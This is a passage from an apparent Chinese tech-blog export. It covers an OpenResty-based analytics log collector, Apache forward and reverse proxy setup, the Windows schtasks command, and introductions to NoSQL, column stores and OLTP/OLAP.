后端脚本为了简单和效率考虑，我打算直接使用nginx的access_log做日志收集，不过有个问题就是nginx配置本身的逻辑表达能力有限，所以我选用了OpenResty做这个事情。OpenResty是一个基于Nginx扩展出的高性能应用开发平台，内部集成了诸多有用的模块，其中的核心是通过ngx_lua模块集成了Lua，从而在nginx配置文件中可以通过Lua来表述业务。关于这个平台我这里不做过多介绍，感兴趣的同学可以参考其官方网站http://openresty.org/，或者这里有其作者章亦春（agentzh）做的一个非常有爱的介绍OpenResty的slide：http://agentzh.org/misc/slides/ngx-openresty-ecosystem/，关于ngx_lua可以参考：https://github.com/chaoslawful/lua-nginx-module。 首先，需要在nginx的配置文件中定义日志格式： log_format tick &quot;$msec^A$remote_addr^A$u_domain^A$u_url^A$u_title^A$u_referrer^A$u_sh^A$u_sw^A$u_cd^A$u_lang^A$http_user_agent^A$u_utrace^A$u_account&quot;;注意这里以u_开头的是我们待会会自己定义的变量，其它的是nginx内置变量。 然后是核心的两个location： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253location /1.gif &#123; #伪装成gif文件 default_type image/gif; #本身关闭access_log，通过subrequest记录log access_log off; access_by_lua " -- 用户跟踪cookie名为__utrace local uid = ngx.var.cookie___utrace if not uid then -- 如果没有则生成一个跟踪cookie，算法为md5(时间戳+IP+客户端信息) uid = ngx.md5(ngx.now() .. ngx.var.remote_addr .. ngx.var.http_user_agent) end ngx.header['Set-Cookie'] = &#123;'__utrace=' .. uid .. '; path=/'&#125; if ngx.var.arg_domain then -- 通过subrequest到/i-log记录日志，将参数和用户跟踪cookie带过去 ngx.location.capture('/i-log?' .. ngx.var.args .. '&amp;utrace=' .. uid) end "; #此请求不缓存 add_header Expires "Fri, 01 Jan 1980 00:00:00 GMT"; add_header Pragma "no-cache"; add_header Cache-Control "no-cache, max-age=0, must-revalidate"; #返回一个1×1的空gif图片 empty_gif; &#125; location /i-log &#123; #内部location，不允许外部直接访问 internal; #设置变量，注意需要unescape set_unescape_uri $u_domain $arg_domain; set_unescape_uri $u_url $arg_url; set_unescape_uri $u_title $arg_title; set_unescape_uri $u_referrer $arg_referrer; set_unescape_uri $u_sh $arg_sh; set_unescape_uri $u_sw $arg_sw; set_unescape_uri $u_cd $arg_cd; set_unescape_uri $u_lang $arg_lang; set_unescape_uri $u_utrace $arg_utrace; set_unescape_uri $u_account $arg_account; #打开日志 log_subrequest on; #记录日志到ma.log，实际应用中最好加buffer，格式为tick access_log /path/to/logs/directory/ma.log tick; #输出空字符串 echo '';&#125; 要完全解释这段脚本的每一个细节有点超出本文的范围，而且用到了诸多第三方ngxin模块（全都包含在OpenResty中了），重点的地方我都用注释标出来了，可以不用完全理解每一行的意义，只要大约知道这个配置完成了我们在原理一节提到的后端逻辑就可以了。 日志轮转真正的日志收集系统访问日志会非常多，时间一长文件变得很大，而且日志放在一个文件不便于管理。所以通常要按时间段将日志切分，例如每天或每小时切分一个日志。我这里为了效果明显，每一小时切分一个日志。我是通过crontab定时调用一个shell脚本实现的，shell脚本如下： 12345_prefix="/path/to/nginx"time=`date +%Y%m%d%H` mv $&#123;_prefix&#125;/logs/ma.log $&#123;_prefix&#125;/logs/ma/ma-$&#123;time&#125;.logkill -USR1 `cat $&#123;_prefix&#125;/logs/nginx.pid` 这个脚本将ma.log移动到指定文件夹并重命名为ma-{yyyymmddhh}.log，然后向nginx发送USR1信号令其重新打开日志文件。 然后再/etc/crontab里加入一行： 59 * * * * root /path/to/directory/rotatelog.sh在每个小时的59分启动这个脚本进行日志轮转操作。 测试下面可以测试这个系统是否能正常运行了。我昨天就在我的博客中埋了相关的点，通过http抓包可以看到ma.js和1.gif已经被正确请求： 同时可以看一下1.gif的请求参数： 相关信息确实也放在了请求参数中。 然后我tail打开日志文件，然后刷新一下页面，因为没有设access log buffer， 我立即得到了一条新日志： 121351060731.360^A0.0.0.0^Awww.codinglabs.org^Ahttp://www.codinglabs.org/^ACodingLabs^A^A1024^A1280^A24^Azh-CN^AMozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4^A4d612be64366768d32e623d594e82678^AU-1-1 注意实际上原日志中的^A是不可见的，这里我用可见的^A替换为方便阅读，另外IP由于涉及隐私我替换为了0.0.0.0。 看一眼日志轮转目录，由于我之前已经埋了点，所以已经生成了很多轮转文件： 关于分析通过上面的分析和开发可以大致理解一个网站统计的日志收集系统是如何工作的。有了这些日志，就可以进行后续的分析了。本文只注重日志收集，所以不会写太多关于分析的东西。 注意，原始日志最好尽量多的保留信息而不要做过多过滤和处理。例如上面的MyAnalytics保留了毫秒级时间戳而不是格式化后的时间，时间的格式化是后面的系统做的事而不是日志收集系统的责任。后面的系统根据原始日志可以分析出很多东西，例如通过IP库可以定位访问者的地域、user agent中可以得到访问者的操作系统、浏览器等信息，再结合复杂的分析模型，就可以做流量、来源、访客、地域、路径等分析了。当然，一般不会直接对原始日志分析，而是会将其清洗格式化后转存到其它地方，如MySQL或HBase中再做分析。 分析部分的工作有很多开源的基础设施可以使用，例如实时分析可以使用Storm，而离线分析可以使用Hadoop。当然，在日志比较小的情况下，也可以通过shell命令做一些简单的分析，例如，下面三条命令可以分别得出我的博客在今天上午8点到9点的访问量（PV），访客数（UV）和独立IP数（IP）： 12345awk -F^A '&#123;print $1&#125;' ma-2012102409.log | wc -lawk -F^A '&#123;print $12&#125;' ma-2012102409.log | uniq | wc -lawk -F^A '&#123;print $2&#125;' ma-2012102409.log | uniq | wc -l 其它好玩的东西朋友们可以慢慢挖掘。 参考GA的开发者文档：https://developers.google.com/analytics/devguides/collection/gajs/ 关于Nginx可以参考：http://wiki.nginx.org/Main OpenResty的官方网站为：http://openresty.org ngx_lua模块可参考：https://github.com/chaoslawful/lua-nginx-module]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache配置正向代理与反向代理]]></title>
    <url>%2Farticles%2FApache%E9%85%8D%E7%BD%AE%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[正向代理配置正向代理很简单，此处我们配置vhost来实现代理, 只需要在浏览器的Proxy选项里加入你的Apache配置的vHost主机即可 开启Apache代理模块并引入vhost配置文件http.conf开启代理模块 1234LoadModule proxy_module modules/mod_proxy.soLoadModule proxy_connect_module modules/mod_proxy_connect.soLoadModule proxy_ftp_module modules/mod_proxy_ftp.soLoadModule proxy_http_module modules/mod_proxy_http.so 引入vhost文件 1Include conf/extra/httpd-vhosts.conf 如果你想监听别的端口, 修改Listen参数 123Listen 80Listen 8087Listen 8088 将想监听的端口全都写上,相应的, 在vhost文件里写上 123NameVirtualHost *:80NameVirtualHost *:8087NameVirtualHost *:8088 NameVirtualHost表示vhost匹配的请求的ip和端口那些会取扫描vhost Apache配置 httpd-vhosts.conf（以Windows下为例）123456789101112131415161718192021222324252627282930313233343536373839404142&lt;VirtualHost *:80&gt; ServerAdmin admin@test.com DocumentRoot &quot;D:/www/test&quot; ServerName www.test.com ServerAlias test.com ErrorLog &quot;logs/test.com-error.log&quot; CustomLog &quot;logs/test.com-access.log&quot; common Alias /sublook &quot;D:/www/test/sublook/&quot; &lt;Directory &quot;D:/www/test&quot;&gt; Options FollowSymLinks AllowOverride All Order allow,deny Allow from all &lt;/Directory&gt; ProxyRequests On ProxyVia On &lt;Proxy *&gt; Order deny,allow Deny from all Allow from 127.0.0.1 &lt;/Proxy&gt;&lt;/VirtualHost&gt; 先看 1&lt;VirtualHost *:80&gt; VirtualHost 后面的参数表示的是该VHost的IP/域名/和端口, 你可以写 : (1) IP: port, 例如 &lt;VirtualHost 175.2.22.65:8088&gt;, 访问的时候通过IP访问 (2) Domain, 例如 &lt;VirtualHost www.test1.com&gt;, 访问的时候通过域名访问, 也可以指定里面的ServerName来指定域名 (3) *, 表示匹配所有对Apache监听主机的请求, 只要是apache监听到的请求都可以匹配该虚拟主机 此处表示的就是监听所有80端口的请求, 但是由于ServerName里写了www.test.com, 所以这个vhost匹配的是www.test.com:80, 现在看正向代理设置那一段 ProxyRequests On：开启Apache正向代理ProxyVia On：控制位于代理服务器链中的代理请求的流向 引用Apache2.2官方文档中对ProxyVia的解释如下： 如果设置为默认值Off ，将不会采取特殊的处理。如果一个请求或应答包含”Via:”头，将不进行任何修改而直接通过。如果设置为On每个请求和应答都会对应当前主机得到一个”Via:”头。如果设置为Full ，每个产生的”Via:”头中都会额外加入Apache服务器的版本，以”Via:”注释域出现。如果设置为Block ，每个代理请求中的所有”Via:”头行都将被删除。且不会产生新的”Via:”头。&lt;Proxy *&gt;…&lt;/Proxy&gt;：用来控制谁可以访问你的代理 12345&lt;Proxy *&gt; Order deny,allow Deny from all Allow from 127.0.0.1&lt;/Proxy&gt; 此处设置为本机可以使用代理，真正使用的时候就自己设置了 浏览器设置（以FireFox为例） 访问效果访问 www.sina.com，观察HTTP请求Response： 可以看到，Via：www.test.com，正向代理成功了。 反向代理2.1 Apache设置 123456789101112131415161718192021222324252627282930313233343536&lt;VirtualHost *:80&gt; ServerAdmin 529156563@qq.com DocumentRoot &quot;D:/www/test&quot; ServerName www.test.com ServerAlias test.com ErrorLog &quot;logs/test.com-error.log&quot; CustomLog &quot;logs/test.com-access.log&quot; common Alias /sublook &quot;D:/www/test/look/sublook/&quot; &lt;Directory &quot;D:/www/test&quot;&gt; Options FollowSymLinks AllowOverride All Order allow,deny Allow from all &lt;/Directory&gt; #反向代理设置 ProxyPass /proxy http://www.proxypass.com/proxy ProxyPassReverse /proxy http://www.proxypass.com/proxy #错误监听 ErrorDocument 404 http://code.me/error.php&lt;/VirtualHost&gt; 现在看反向代理设置那一段 ProxyPass /proxy http://www.proxypass.com/proxy: 将 www.test.com/proxy 域下的所有请求转发给 www.proxypass.com/proxy 代理，例如 www.test.com/proxy/login.php 会交给 www.proxypass.com/proxy/代理 ProxyPassReverse /proxy http://www.proxypass.com/proxy ： www.proxypass.com/proxy/login.php 中有如下代码： 123&lt;?php header('Location:http://www.proxypass.com/proxy/result.php');?&gt; 那么在重定向的时候，Apache会将HTTP请求重新设为 http://www.test.com/proxy/result.php， 这样的作用稍后讲解 www.proxypass.com/proxy/result.php 中有如下代码： 123&lt;?php echo 'in proxypass.com &lt;br&gt;';?&gt; 2.2 浏览器访问效果 访问 www.test.com/proxy/login.php Apache将请求交给 www.proxypass.com/proxy/login.php 代理，HTTP请求如图： 可以发现其实Request中的请求还是 www.test.com 的，但是它确实是由 www.proxypass.com 来处理的 proxypass.com/proxy/login.php 重定向到 proxypass.com/proxy/result.php 页面显示 in proxypass.com HTTP请求如图： 也可以看到请求依然是 www.test.com/proxy/result.php 这里就是 ProxyPassReverse 发挥作用的地方，如果不加这个项，重定向后HTTP请求会如下图： 可以发现请求中的GET是 www.proxypass.com 而不是 www.test.com ，这是因为配置了ProxyPassReverse后，proxypass.com/proxy/login.php 在重定向到 proxypass.com/proxy/result.php 时，Apache会将它调整回 test.com/proxy/result.php , 然后Apache再将 test.com/proxy/result.php 代理给 proxypass.com/proxy/result.php，所以说配置了 ProxyPassReverse 后，即使 proxypass.com/proxy 下的程序有重定向到其他 proxypss.com/proxy 的文件的（如 login.php 重定向到 result.php），你也不会在请求中发现 proxypass.com 的影子]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Schtasks命令详解(计划任务DOS批处理)]]></title>
    <url>%2Farticles%2FSchtasks%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1DOS%E6%89%B9%E5%A4%84%E7%90%86-%2F</url>
    <content type="text"><![CDATA[安排命令和程序定期运行或在指定时间内运行。从计划表中添加和删除任务，按需要启动和停止任务，显示和更改计划任务。 语法1schtasks /create /tn TaskName /tr TaskRun /sc schedule [/momodifier] [/dday] [/mmonth[,month...] [/iIdleTime] [/stStartTime] [/sdStartDate] [/edEndDate] [/scomputer[/u[domain\]user/ppassword]][/ru&#123;[Domain\]User|"System"&#125; [/rpPassword]] /? 参数/tn TaskName 指定任务的名称。 /tr TaskRun 指定任务运行的程序或命令。键入可执行文件、脚本文件或批处理文件的完全合格的路径和文件名。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。 /sc schedule 指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。 1234567891011有效值说明MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY 指定计划的时间单位。ONCE 任务在指定的日期和时间运行一次。ONSTART 任务在每次系统启动的时候运行。可以指定启动的日期，或下一次系统启动的时候运行任务。ONLOGON 每当用户（任意用户）登录的时候，任务就运行。可以指定日期，或在下次用户登录的时候运行任务。ONIDLE 只要系统空闲了指定的时间，任务就运行。可以指定日期，或在下次系统空闲的时候运行任务。 /mo modifier 指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。 123456789101112131415参数说明MINUTE 1～1439 任务每n分钟运行一次。HOURLY 1～23 任务每n小时运行一次。`DAILY 1～365 任务每n天运行一次。WEEKLY 1～52 任务每n周运行一次。MONTHLY 1～12 任务每n月运行一次。LASTDAY 任务在月份的最后一天运行。FIRST、SECOND、THIRD、FOURTH、LAST 与 `/d day` 参数共同使用,并在特定的周和天运行任务。例如，在月份的第三个周三。 /d dirlist 指定周或月的一天。只与 WEEKLY 或 MONTHLY 计划共同使用时有效。 12345计划类型 WEEKLY 可选项。有效值是 MON ~ SUN 和 * （每一天）。MON 是默认值。MONTHLY 在使用 FIRST、SECOND、THIRD、FOURTH 或 LAST 修饰符 (/mo) 时，需要 MON ～ SUN 中的某个值。1 ～ 31 是可选的，只在没有修饰符或修饰符为1 ～ 12类型时有效。默认值是 1 （月份的第一天）。 /m month[,month…] 指定一年中的一个月。有效值是 JAN ～ DEC 和 * （每个月）。/m参数只对于 MONTHLY 计划有效。在使用 LASTDAY 修饰符时，这个参数是必需的。否则，它是可选的，默认值是 * （每个月）。 /i InitialPageFileSize 指定任务启动之前计算机空闲多少分钟。键入一个1 ～ 999之间的整数。这个参数只对于 ONIDLE 计划有效，而且是必需的。 /st StartTime 以HH:MM:SS24 小时格式指定时间。默认值是命令完成时的当前本地时间。/st参数只对于 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY 和 ONCE 计划有效。它只对于 ONCE 计划是必需的。 /sd StartDate 以MM/DD/YYYY格式指定任务启动的日期。默认值是当前日期。/sd参数对于所有的计划有效，但只对于 ONCE 计划是必需的。 /ed EndDate 指定任务计划运行的最后日期。此参数是可选的。它对于 ONCE、ONSTART、ONLOGON 或 ONIDLE 计划无效。默认情况下，计划没有结束日期。 /s Computer 指定远程计算机的名称或 IP 地址（带有或者没有反斜杠）。默认值是本地计算机。 /u [domain]user 使用特定用户帐户的权限运行命令。默认情况下，使用已登录到运行 SchTasks 的计算机上的用户的权限运行命令。 /p password 指定在/u参数中指定的用户帐户的密码。如果使用/u参数，则需要该参数。 /ru {[Domain]User|”System”} 使用指定用户帐户的权限运行任务。默认情况下，使用用户登录到运行 SchTasks 的计算机上的权限运行任务。 123值说明[domain\&#125;User? 指定用户帐户。 &quot;System&quot;或&quot;&quot; 指定操作系统使用的 NT Authority\System 帐户。 /p Password 指定用户帐户的密码，该用户帐户在/u参数中指定。如果在指定用户帐户的时候忽略了这个参数，SchTasks.exe 会提示您输入密码而且不显示键入的文本。使用 NT Authority\System 帐户权限运行的任务不需要密码，SchTasks.exe 也不会提示索要密码。 /? 在命令提示符显示帮助。 范例计划任务每 20 分钟运行一次下面的命令计划安全脚本 Sec.vbs 每 20 分钟运行一次。由于命令没有包含起始日期或时间，任务在命令完成 20 分钟后启动，此后每当系统运行它就每 20 分钟运行一次。请注意，安全脚本源文件位于远程计算机上，但任务在本地计算机上计划并执行。 1schtasks /create /sc minute /mo 20 /tn "Security scrīpt" /tr \\central\data\scrīpts\sec.vbs 计划命令在每小时过五分的时候运行下面的命令将计划 MyApp 程序从午夜过后五分钟起每小时运行一次。因为忽略了/mo参数，命令使用了小时计划的默认值，即每 (1) 小时。如果该命令在 12:05 A.M 之后生成，程序将在第二天才会运行。 schtasks /create /sc hourly /st 00:05:00 /tn “My App” /tr c:\apps\myapp.exe 计划命令每五小时运行一次 下面的命令计划 MyApp 程序从 2001 年 3 月的第一天起每五小时运行一次。它使用/mo参数来指定间隔时间，使用/sd参数来指定起始日期。由于命令没有指定起始时间，当前时间被用作起始时间。 123schtasks /create /sc hourly /mo 5 /sd 03/01/2001 /tn "My App" /tr c:\apps\myapp.exeschtasks create daily 计划任务每天运行一次下面的范例计划 MyApp 程序在每天的 8:00 A.M. 运行一次，直到 2001 年 12 月 31 日结束。由于它忽略了/mo参数，所以使用默认间隔 1 来每天运行命令。 1schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc daily /st 08:00:00 /ed 12/31/2001 计划任务每六周运行一次下面的命令计划 MyApp 程序在远程计算机上每六周运行一次。该命令使用/mo参数来指定间隔。它也使用/s参数来指定远程计算机，使用/ru参数来计划任务以用户的 Administrator 帐户权限运行。因为忽略了/rp参数，SchTasks.exe 会提示用户输入 Administrator 帐户密码。 另外，因为命令是远程运行的，所以命令中所有的路径，包括到 MyApp.exe 的路径，都是指向远程计算机上的路径。 1schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc weekly /mo 6 /s Server16 /ru Admin01 如何关闭dos窗口提示12345// 使用vbs 在后台静默执行Set ws = CreateObject("Wscript.Shell")ws.run "cmd /c d:\wamp\www\code\queue\task",vbhide]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[NoSQL 简介]]></title>
    <url>%2Farticles%2FNoSQL-%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[前言NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。 在现代的计算系统上每天网络上都会产生庞大的数据量。 这些数据有很大一部分是由关系数据库管理系统（RDMBSs）来处理。 1970年 E.F.Codd’s提出的关系模型的论文 “A relational model of data for large shared data banks”，这使得数据建模和应用程序编程更加简单。 通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。 NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至2009年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。 关系型数据库事务在英文中是transaction，和现实世界中的交易很类似，关系型数据库遵循ACID规则。它有如下四个特性： A (Atomicity) 原子性 原子性很容易理解，也就是说事务里的所有操作要么全部做完，要么都不做，事务成功的条件是事务里的所有操作都成功，只要有一个操作失败，整个事务就失败，需要回滚。 比如银行转账，从A账户转100元至B账户，分为两个步骤：1）从A账户取100元；2）存入100元至B账户。这两步要么一起完成，要么一起不完成，如果只完成第一步，第二步失败，钱会莫名其妙少了100元。 C (Consistency) 一致性 一致性也比较容易理解，也就是说数据库要一直处于一致的状态，事务的运行不会改变数据库原本的一致性约束。 例如现有完整性约束a+b=10，如果一个事务改变了a，那么必须得改变b，使得事务结束后依然满足a+b=10，否则事务失败。 I (Isolation) 独立性 所谓的独立性是指并发的事务之间不会互相影响，如果一个事务要访问的数据正在被另外一个事务修改，只要另外一个事务未提交，它所访问的数据就不受未提交事务的影响。 比如现有有个交易是从A账户转100元至B账户，在这个交易还未完成的情况下，如果此时B查询自己的账户，是看不到新增加的100元的。 D (Durability) 持久性 持久性是指一旦事务提交后，它所做的修改将会永久的保存在数据库上，即使出现宕机也不会丢失。 分布式系统分布式系统（distributed system）由多台计算机和通信的软件组件通过计算机网络连接（本地网络或广域网）组成。 分布式系统是建立在网络之上的软件系统。正是因为软件的特性，所以分布式系统具有高度的内聚性和透明性。 因此，网络和分布式系统之间的区别更多的在于高层软件（特别是操作系统），而不是硬件。 分布式系统可以应用在在不同的平台上如：Pc、工作站、局域网和广域网上等。 分布式计算的优点 可靠性（容错） ： 分布式计算系统中的一个重要的优点是可靠性。一台服务器的系统崩溃并不影响到其余的服务器。 可扩展性：在分布式计算系统可以根据需要增加更多的机器。 资源共享：共享数据是必不可少的应用，如银行，预订系统。 灵活性：由于该系统是非常灵活的，它很容易安装，实施和调试新的服务。 更快的速度：分布式计算系统可以有多台计算机的计算能力，使得它比其他系统有更快的处理速度。 开放系统：由于它是开放的系统，本地或者远程都可以访问到该服务。 更高的性能：相较于集中式计算机网络集群可以提供更高的性能（及更好的性价比）。 分布式计算的缺点 故障排除：故障排除和诊断问题。 软件：更少的软件支持是分布式计算系统的主要缺点。 网络：网络基础设施的问题，包括：传输问题，高负载，信息丢失等。 安全性：开发系统的特性让分布式计算系统存在着数据的安全性和共享的风险等问题。 NoSql什么是NoSQLNoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。 NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。 为什么使用NoSQL今天我们可以通过第三方平台（如：Google,Facebook等）可以很容易的访问和抓取数据。用户的个人信息，社交网络，地理位置，用户生成的数据和用户操作日志已经成倍的增加。我们如果要对这些用户数据进行挖掘，那SQL数据库已经不适合这些应用了, NoSQL数据库的发展也却能很好的处理这些大的数据。 实例 社会化关系网: 12345Each record: UserID1, UserID2Separate records: UserID, first_name,last_name, age, gender,...Task: Find all friends of friends of friends of ... friends of a given user. Wikipedia 页面 : 12345Large collection of documentsCombination of structured and unstructured dataTask: Retrieve all pages regarding athletics of Summer Olympic before 1950. RDBMS vs NoSQL RDBMS 高度组织化结构化数据 结构化查询语言（SQL） (SQL) 数据和关系都存储在单独的表中。 数据操纵语言，数据定义语言 严格的一致性 基础事务 NoSQL 代表着不仅仅是SQL 没有声明性查询语言 没有预定义的模式 -键 - 值对存储，列存储，文档存储，图形数据库 最终一致性，而非ACID属性 非结构化和不可预知的数据 CAP定理 高性能，高可用性和可伸缩性 NoSQL 简史NoSQL一词最早出现于1998年，是Carlo Strozzi开发的一个轻量、开源、不提供SQL功能的关系数据库。 2009年，Last.fm的Johan Oskarsson发起了一次关于分布式开源数据库的讨论[2]，来自Rackspace的Eric Evans再次提出了NoSQL的概念，这时的NoSQL主要指非关系型、分布式、不提供ACID的数据库设计模式。 2009年在亚特兰大举行的”no:sql(east)”讨论会是一个里程碑，其口号是”select fun, profit from real_world where relational=false;”。因此，对NoSQL最普遍的解释是”非关联型的”，强调Key-Value Stores和文档数据库的优点，而不是单纯的反对RDBMS。 CAP定理（CAP theorem）在计算机科学中, CAP定理（CAP theorem）, 又被称作 布鲁尔定理（Brewer’s theorem）, 它指出对于一个分布式计算系统来说，不可能同时满足以下三点: 一致性(Consistency) (所有节点在同一时间具有相同的数据)可用性(Availability) (保证每个请求不管成功或者失败都有响应)分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作) CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。 因此，根据 CAP 原理将 NoSQL 数据库分成了满足 CA 原则、满足 CP 原则和满足 AP 原则三 大类： CA - 单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大。 CP - 满足一致性，分区容忍性的系统，通常性能不是特别高。 AP - 满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。 NoSQL的优点/缺点优点: 高可扩展性- 分布式计算- 低成本- 架构的灵活性，半结构化数据- 没有复杂的关系 缺点: 没有标准化- 有限的查询功能（到目前为止）- 最终一致是不直观的程序 BASE BASE：Basically Available, Soft-state, Eventually Consistent。 由 Eric Brewer 定义。 CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。 BASE是NoSQL数据库通常对可用性及一致性的弱要求原则: Basically Availble –基本可用Soft-state –软状态/柔性事务。 “Soft state” 可以理解为”无连接”的, 而 “Hard state” 是”面向连接”的Eventual Consistency –最终一致性 最终一致性， 也是是 ACID 的最终目的。 ACID vs BASEACIDBASE原子性(Atomicity)基本可用(Basically Available)一致性(Consistency)软状态/柔性事务(Soft state)隔离性(Isolation)最终一致性 (Eventual consistency)持久性 (Durable) NoSQL 数据库分类类型部分代表 特点列存储 Hbase Cassandra Hypertable 顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。 文档存储 MongoDB CouchDB 文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有有机会对某些字段建立索引，实现关系数据库的某些功能。 key-value存储 Tokyo Cabinet / Tyrant Berkeley DB MemcacheDB Redis 可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能） 图存储 Neo4J FlockDB 图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。 对象存储 db4o Versant 通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。 xml数据库 Berkeley DB XML BaseX 高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[行式数据库与列式数据库]]></title>
    <url>%2Farticles%2F%E8%A1%8C%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E5%88%97%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[一 基本概念在关系数据库领域，除传统的ORACLE、SQLSERVER、MYSQL等行式数据库外，目前在数据仓库领域列式数据库越来越受到关注。目前商用的列式数据库主要是Sybase IQ。 一般，行式数据库主要适合于在线交易性的OLTP应用，而列式数据库主要适合于海量静态数据的分析，一般应用于OLAP。但只是依靠OLTP还是OLAP来区分是采用行式数据库还是列式数据库，在很多时候还不是很明确，特别很多时候有些应用很难说是OLTP还是OLAP，例如对海量数据的查询。 根据笔者最近的对ORACLE和SYBASE IQ的初步研究与测试，笔者认为关键点是行式数据库适合“少数行多数列”的应用，而列式数据库适合于“少数列多数行的应用”。行的多少可理解为sql 查询语句中符合where 之后的过滤条件的行数占总行数的比例，列的多少可理解为select 之后涉及到的行数。 对于普通的 “select f1 ,f2, f3,f4 where xxxx “查询，sybase IQ的查询速度会很快，但是关键问题是如果select 的列很多，则在取数据时会非常慢，而对oracle数据库不管是取一列还是取所有列其时间开销基本不变。 二 对比1 行式更适合OLTP, 查询一个记录的所有列。 列式更适合OLAP，非常适合于在数据仓库领域发挥作用，比如数据分析、海量存储和商业智能；涉及不经常更新的数据。由于设计上的不同，列式数据库在并行查询处理和压缩上更有优势。而且数据是以列为单元存储，完全不用考虑数据建模或者说建模更简单了。要查询计算哪些列上的数据，直接读取列就行。 2 列式在存储方面占有很大的优势，能有效提高数据压缩比，节省存储空间。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[OLAP、OLTP的介绍和比较]]></title>
    <url>%2Farticles%2FOLAP-OLTP%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%92%8C%E6%AF%94%E8%BE%83%2F</url>
    <content type="text"><![CDATA[OLTP与OLAP的介绍 数据处理大致可以分成两大类：联机事务处理OLTP（on-line transaction processing）、联机分析处理OLAP（On-Line Analytical Processing）。OLTP是传统的关系型数据库的主要应用，主要是基本的、日常的事务处理，例如银行交易。OLAP是数据仓库系统的主要应用，支持复杂的分析操作，侧重决策支持，并且提供直观易懂的查询结果。 OLTP 系统强调数据库内存效率，强调内存各种指标的命令率，强调绑定变量，强调并发操作； OLAP 系统则强调数据分析，强调SQL执行市场，强调磁盘I/O，强调分区等。 OLTP与OLAP之间的比较： OLTP，也叫联机事务处理（Online Transaction Processing），表示事务性非常高的系统，一般都是高可用的在线系统，以小的事务以及小的查询为主，评估其系统的时候，一般看其每秒执行的Transaction以及Execute SQL的数量。在这样的系统中，单个数据库每秒处理的Transaction往往超过几百个，或者是几千个，Select 语句的执行量每秒几千甚至几万个。典型的OLTP系统有电子商务系统、银行、证券等，如美国eBay的业务数据库，就是很典型的OLTP数据库。 OLTP系统最容易出现瓶颈的地方就是CPU与磁盘子系统。 （1）CPU出现瓶颈常表现在逻辑读总量与计算性函数或者是过程上，逻辑读总量等于单个语句的逻辑读乘以执行次数，如果单个语句执行速度虽然很快，但是执行次数非常多，那么，也可能会导致很大的逻辑读总量。设计的方法与优化的方法就是减少单个语句的逻辑读，或者是减少它们的执行次数。另外，一些计算型的函数，如自定义函数、decode等的频繁使用，也会消耗大量的CPU时间，造成系统的负载升高，正确的设计方法或者是优化方法，需要尽量避免计算过程，如保存计算结果到统计表就是一个好的方法。 （2）磁盘子系统在OLTP环境中，它的承载能力一般取决于它的IOPS处理能力. 因为在OLTP环境中，磁盘物理读一般都是db file sequential read，也就是单块读，但是这个读的次数非常频繁。如果频繁到磁盘子系统都不能承载其IOPS的时候，就会出现大的性能问题。 OLTP比较常用的设计与优化方式为Cache技术与B-tree索引技术，Cache决定了很多语句不需要从磁盘子系统获得数据，所以，Web cache与Oracle data buffer对OLTP系统是很重要的。另外，在索引使用方面，语句越简单越好，这样执行计划也稳定，而且一定要使用绑定变量，减少语句解析，尽量减少表关联，尽量减少分布式事务，基本不使用分区技术、MV技术、并行技术及位图索引。因为并发量很高，批量更新时要分批快速提交，以避免阻塞的发生。 OLTP 系统是一个数据块变化非常频繁，SQL 